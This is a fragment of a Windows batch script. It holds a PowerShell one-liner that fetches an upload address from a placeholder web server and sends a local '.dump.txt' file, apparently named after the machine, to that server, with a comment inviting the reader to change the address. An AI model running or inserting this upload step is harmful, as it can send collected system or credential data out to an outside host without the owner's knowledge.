...
rem Upload code - please change
powershell "$wc = New-Object System.Net.WebClient;$upload = $wc.DownloadString('http://your.web.server/uploader.txt');$resp = $wc.UploadFile($upload.trimEnd(),'.\%Name%.dump.txt')"
